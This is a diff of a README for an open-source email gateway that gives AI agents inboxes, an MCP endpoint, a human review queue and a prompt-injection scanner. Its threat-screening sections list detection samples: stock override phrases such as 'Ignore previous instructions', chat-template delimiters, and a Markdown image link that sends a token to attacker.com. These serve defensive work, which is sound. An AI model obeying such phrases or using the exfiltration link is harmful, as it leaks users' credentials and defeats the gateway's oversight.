@@ -2,11 +2,16 @@
 
 <div align="center">
 
-### The Open-Source Email Gateway & Authenticated Inboxes for AI Agents.
+### The Open-Source Email Gateway & Authenticated Inboxes for AI Agents
 
-Give autonomous AI agents real, two-way email inboxes with cryptographic SPF/DKIM/DMARC evidence, prompt-injection content screening, and human-in-the-loop review gates.
+Give autonomous AI agents real two-way email inboxes, incoming SMTP reception, upstream relay sending, cryptographic SPF/DKIM/DMARC evidence, prompt-injection screening, and human-in-the-loop review gates.
 
-**FastAPI Backend** · **Next.js 15 & Tailwind CSS v4 Dashboard** · **Model Context Protocol (MCP)** · **Async SQLite / PostgreSQL**
+[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
+[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/)
+[![FastAPI](https://img.shields.io/badge/FastAPI-0.110+-green.svg)](https://fastapi.tiangolo.com/)
+[![Next.js](https://img.shields.io/badge/Next.js-16.4-black.svg)](https://nextjs.org/)
+[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-v4-38bdf8.svg)](https://tailwindcss.com/)
+[![MCP](https://img.shields.io/badge/MCP-JSON--RPC-purple.svg)](https://modelcontextprotocol.io/)
 
 </div>
 
@@ -14,51 +19,60 @@ Give autonomous AI agents real, two-way email inboxes with cryptographic SPF/DKI
 
 ## 🌟 Key Capabilities
 
-1. **Two-Way Agent Inboxes**: Create dedicated email addresses for agents (e.g., `support@agents.local`, `sales@agents.local`, `security@agents.local`).
-2. **RFC Thread Topology**: Automatically tracks `Message-ID`, `In-Reply-To`, and `References` so AI agents participate in real Outlook/Gmail threads seamlessly.
-3. **Inbound Prompt-Injection Screening**: Built-in heuristic threat scanner intercepts indirect prompt injections, hidden CSS/zero-font smuggling, jailbreak delimiters, and Markdown image exfiltration.
-4. **Human-in-the-Loop (HITL) Queue**: Dangerous or sensitive emails are placed in `pending_review` until approved or rejected by a human operator in the dashboard or via MCP.
-5. **Real-Time WebSocket Streaming**: Agents subscribe to `/v1/agents/{email}/ws` to stream new emails in real time without needing public URLs or ngrok tunnels.
-6. **Model Context Protocol (MCP) Server**: Point Cursor, Claude Code, or Windsurf at `http://localhost:8000/mcp/rpc` to give coding agents direct email capabilities.
-7. **Interactive Simulator**: Test clean customer emails or simulate sophisticated prompt-injection attacks directly in the UI with instant diagnosis.
+- **📬 Real Inbound SMTP Daemon**: Binds TCP port `2525` (dev) or `25` (production) to accept incoming emails directly from standard Mail Transfer Agents (MTAs) and external servers.
+- **⚡ Upstream Outbound SMTP Relay**: Agents send real emails over the internet through upstream providers (AWS SES, Resend, SendGrid, Postmark, or Gmail SMTP with App Passwords).
+- **🌐 Domains & DNS Record Verification**: Configure custom domains (e.g. `agents.yourdomain.com`) with auto-generated **MX**, **SPF**, **DKIM** (RSA), and **DMARC** records and real-time DNS status checks.
+- **🧵 Standards-Compliant RFC Threading**: Automatically preserves RFC `Message-ID`, `In-Reply-To`, and `References` headers so agents participate seamlessly in long Gmail or Outlook conversation threads.
+- **🛡️ Inbound Threat & Prompt-Injection Screening**: Built-in heuristic detector intercepts indirect prompt injections, hidden CSS / zero-point font tricks, ChatML delimiters (`<|im_start|>`), and Markdown data exfiltration.
+- **👤 Human-in-the-Loop (HITL) Approval Queue**: Configurable policy holds sensitive or suspicious inbound and outbound emails in `pending_review` until an operator approves or quarantines them.
+- **🤖 Model Context Protocol (MCP) Gateway**: Out-of-the-box MCP endpoint (`http://localhost:8000/mcp/rpc`) enables coding agents in **Cursor**, **Claude Code**, **Claude Desktop**, and **Windsurf** to read inboxes, reply, and send emails autonomously.
+- **🔑 Bearer API Keys**: Manage tokens (`oae_live_...`) with fine-grained permission scopes for Python / TypeScript agent frameworks (LangChain, CrewAI, PydanticAI, OpenAI Agents SDK).
 
 ---
 
 ## 🏗️ Architecture
 
-```
-       Customer (Gmail / Outlook)  ·  External Systems
-                       │            ▲
-         Inbound Email │            │ Outbound Send / Reply
-                       ▼            │
-         ┌──────────────────────────────────────┐
-         │     Open Agent Email Gateway         │
-         │  • SPF / DKIM / DMARC verification   │
-         │  • Heuristic Prompt-Injection Scan   │
-         │  • Human-in-the-Loop (HITL) Queue    │
-         │  • RFC Threading (In-Reply-To)       │
-         └──────────────────┬───────────────────┘
-                            │
-            ┌───────────────┴───────────────┐
-            ▼                               ▼
-    Next.js Dashboard            Autonomous AI Agents
-    • Live Inbox View            • WebSocket Stream (:8000/v1/agents/{email}/ws)
-    • HITL Review Queue          • MCP Server (:8000/mcp/rpc)
-    • Attack Simulator           • REST API (:8000/v1)
+```text
+    Real External Inboxes (Gmail / Outlook)  ·  Another AI Agent
+                     │                                ▲
+      Inbound SMTP   │                                │  Outbound Upstream SMTP
+       (Port 2525)   ▼                                │  (AWS SES / Resend / Gmail)
+  ┌───────────────────────────────────────────────────┴───────────────────────┐
+  │                   Open Agent Email Gateway (FastAPI)                      │
+  │                                                                           │
+  │  1. Inbound SMTP Receiver (RFC 5321 / 5322)                               │
+  │  2. Threat Scanner (Prompt Injection / Hidden Text / Exfiltration)       │
+  │  3. Human-in-the-Loop (HITL) Review Gate                                  │
+  │  4. Local Loopback Relay (Agent-to-Agent) & Upstream SMTP Relay           │
+  │  5. SQLite / PostgreSQL Store with RFC Header Thread Tracking            │
+  └───────────────────────────────┬───────────────────────────────────────────┘
+                                  │  WebSockets / MCP / REST
+                                  ▼
+  ┌───────────────────────────────────────────────────────────────────────────┐
+  │     Next.js Dashboard (:3000)      ·     Coding Agents (Cursor / Claude)  │
+  │     • Live Inboxes & Thread View         • list_messages, get_message     │
+  │     • Domains & DNS Verification         • send_message, reply_to_message │
+  │     • Upstream SMTP Configuration        • list_reviews, approve_review   │
+  │     • HITL Review Queue & API Keys       • WebSocket stream listener      │
+  └───────────────────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
 ## 🚀 Quickstart
 
-### 1. Start the FastAPI Backend
+### Prerequisites
+- Python 3.11+
+- Node.js 18+ & npm
+
+### 1. Start the Server (FastAPI + Inbound SMTP)
 
 ```bash
-cd backend
-# Create virtual environment
+cd server
+
+# Create and activate virtual environment
 python -m venv .venv
 
-# Activate venv:
 # On Windows:
 .\.venv\Scripts\activate
 # On Linux/macOS:
@@ -67,18 +81,19 @@ source .venv/bin/activate
 # Install dependencies
 pip install -r requirements.txt
 
-# Run the backend
+# Start server
 python run.py
 ```
 
-- API Server: `http://127.0.0.1:8000`
-- Interactive OpenAPI Docs: `http://127.0.0.1:8000/docs`
-- MCP Endpoint: `http://127.0.0.1:8000/mcp/info`
+The server initializes:
+- **FastAPI HTTP API & MCP**: `http://127.0.0.1:8000`
+- **Interactive OpenAPI Docs**: `http://127.0.0.1:8000/docs`
+- **Inbound SMTP Listener**: `127.0.0.1:2525`
 
-### 2. Start the Next.js Frontend Dashboard
+### 2. Start the Client (Next.js Dashboard)
 
 ```bash
-cd frontend
+cd client
 npm install
 npm run dev
 ```
@@ -87,10 +102,54 @@ Open `http://localhost:3000` in your browser.
 
 ---
 
-## 🤖 Connecting to Coding Agents via MCP
+## 🐳 Docker Deployment
+
+Run the complete gateway stack with Docker Compose:
+
+```bash
+docker compose up -d --build
+```
+
+- Web Dashboard: `http://localhost:3000`
+- REST API & MCP: `http://localhost:8000`
+- SMTP Listener: Port `2525` (or map to `25` for direct internet MX delivery)
+
+---
+
+## ⚙️ Configuration & Features
+
+### 1. Upstream SMTP Relay (`/settings`)
+To let your agents send real emails to external people over the internet:
+1. Navigate to **Upstream SMTP** in the dashboard.
+2. Enter your provider details:
+   - **Gmail**: Host `smtp.gmail.com`, Port `587`, STARTTLS enabled, Username, and [Google App Password](https://myaccount.google.com/apppasswords).
+   - **AWS SES**: Host `email-smtp.us-east-1.amazonaws.com`, Port `587`, SMTP credentials.
+   - **Resend / SendGrid / Postmark**: Standard SMTP relay credentials.
+3. Test delivery instantly with the built-in **Send Live Test Email** tool.
+
+### 2. Custom Domains & DNS (`/domains`)
+1. Add your agent domain (e.g., `agents.yourdomain.com`).
+2. Add the generated DNS records to your DNS registrar (Cloudflare, Route53, Namecheap):
+   - `MX`: `10 mx.yourdomain.com` pointing to your server IP.
+   - `TXT (SPF)`: `v=spf1 include:_spf.openagent.dev ~all`
+   - `TXT (DKIM)`: `default._domainkey` with RSA public key.
+   - `TXT (DMARC)`: `_dmarc` with `p=quarantine` or `p=reject`.
+3. Click **Verify DNS** to confirm records.
+
+### 3. Human-in-the-Loop Review Gate (`/reviews`)
+When an agent has `hitl_enabled: true` or when the Threat Scanner detects suspicious prompt injection payloads:
+- Inbound mail is quarantined before reaching the agent.
+- Outbound mail is held before dispatching to upstream SMTP.
+- Operators review reason, threat score, and diffs in the review queue and click **Approve** or **Reject**.
+
+---
+
+## 🤖 Coding Agent Integration (MCP)
+
+Connect any Model Context Protocol compatible client to control agent inboxes.
 
 ### Cursor Setup
-Add to `.cursor/mcp.json` or `~/.cursor/mcp.json`:
+Add to `.cursor/mcp.json` (or `~/.cursor/mcp.json`):
 
 ```json
 {
@@ -108,29 +167,57 @@ claude mcp add open-agent-email http://127.0.0.1:8000/mcp/rpc
 ```
 
 ### Available MCP Tools
-- `list_agents`: View available agent email inboxes.
-- `list_messages`: Read inbound and outbound emails for an inbox.
-- `get_message`: Fetch full email body and security scan details.
-- `send_message`: Send an outbound email.
-- `reply_to_message`: Reply in-thread with RFC headers preserved.
-- `list_reviews`: View held emails awaiting human approval.
-- `approve_review`: Approve and release a held message.
-- `reject_review`: Reject a suspicious message.
+| Tool | Description |
+| :--- | :--- |
+| `list_agents` | Lists all configured agent inboxes and their operational status. |
+| `list_messages` | Fetches inbound and outbound messages with status and threat scores. |
+| `get_message` | Retrieves full RFC headers, body text, HTML, and security verification verdicts. |
+| `send_message` | Dispatches outbound email from the agent address (relays via upstream SMTP). |
+| `reply_to_message` | Replies in-thread preserving `In-Reply-To` and `References`. |
+| `list_reviews` | Lists emails held in the Human-in-the-Loop approval queue. |
+| `approve_review` | Approves a held email and triggers delivery. |
+| `reject_review` | Rejects and quarantines an email. |
 
 ---
 
-## 🔒 Threat Screening Rules
+## 📡 Python SDK & WebSockets Example
 
-The scanner flags:
-- **Instruction Overrides**: `Ignore previous instructions`, `Disregard system directives`, etc.
-- **Hidden Text & Evasion**: `display:none`, `font-size:0`, `visibility:hidden`, zero-width Unicode characters.
-- **Chat Delimiter Smuggling**: `<|im_start|>`, `[INST]`, `### System:`.
-- **Data Exfiltration**: Markdown image link traps and credential requests.
-- **Base64 Smuggling**: Decodes and inspects obfuscated instructions.
+Connect an autonomous agent to stream incoming emails over WebSockets without opening firewall ports or using ngrok:
 
-Thresholds are configurable per-agent: `off`, `low`, `medium`, or `high`.
+```python
+import asyncio
+import websockets
+import json
+
+AGENT_EMAIL = "assistant@agents.local"
+WS_URL = f"ws://127.0.0.1:8000/v1/agents/{AGENT_EMAIL}/ws"
+
+async def listen():
+    async with websockets.connect(WS_URL) as ws:
+        print(f"Connected to live stream for {AGENT_EMAIL}")
+        while True:
+            msg = await ws.recv()
+            event = json.loads(msg)
+            if event.get("event") == "email.received":
+                data = event["data"]
+                print(f"New email from: {data['sender']} - Subject: {data['subject']}")
+
+asyncio.run(listen())
+```
+
+---
+
+## 🔒 Threat Screening Engine
+
+The built-in scanner guards agent inboxes against:
+- **Direct Instruction Overrides**: `Ignore previous instructions`, `Disregard system prompts`, `System Override`.
+- **CSS / Font Smuggling**: `display:none`, `font-size:0px`, `visibility:hidden`, zero-width Unicode tags.
+- **ChatML & Prompt Delimiters**: `<|im_start|>`, `[INST]`, `### System:`, `<|endoftext|>`.
+- **Exfiltration Attacks**: Markdown image credential leaks (`![img](https://attacker.com/log?token=...)`).
+- **Base64 Payload Obfuscation**: Automatic decoding and heuristic recursion.
 
 ---
 
 ## 📄 License
-Apache 2.0
+
+Apache 2.0. Open-source for developers and autonomous AI agent systems.
